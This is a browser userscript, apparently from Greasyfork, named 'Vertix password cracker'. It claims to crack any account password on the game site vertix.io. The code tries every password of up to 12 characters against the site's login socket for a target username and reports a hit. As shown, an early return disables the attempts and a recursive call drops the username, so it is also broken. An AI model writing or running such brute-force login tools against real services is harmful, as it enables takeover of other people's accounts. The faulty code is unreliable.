// ==UserScript==
// @name         Vertix password cracker
// @version      0.1
// @description  Cracks any password on vertix
// @author       dannytech
// @match        vertix.io
// @grant        none
// @namespace https://greasyfork.org/users/65245
// @downloadURL https://update.greasyfork.org/scripts/23143/Vertix%20password%20cracker.user.js
// @updateURL https://update.greasyfork.org/scripts/23143/Vertix%20password%20cracker.meta.js
// ==/UserScript==

var charset = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ ".split("");
function recurse(input, current, username) {
    if(current === 0) return input;
    for(var i = 0; i < charset.length; i++) {
        tryCombination(input + charset[i], username);
    }
    for(var j = 0; j < charset.length; j++) {
        recurse(input + charset[j], current - 1);
    }
}
window.crack = function(username) {
    'use strict';

    // Loops through the possible passwords
    recurse("", 12, username);
};
function tryCombination(attempt, username) {
    return;
    socket.emit("dbLogin", {
        userName: username,
        userPass: attempt
    });
    socket.on("logRes", function(event, data, cb) {
        if(data != "incorrect password") {
            alert("It worked");
            window.location.reload();
        }
    });
}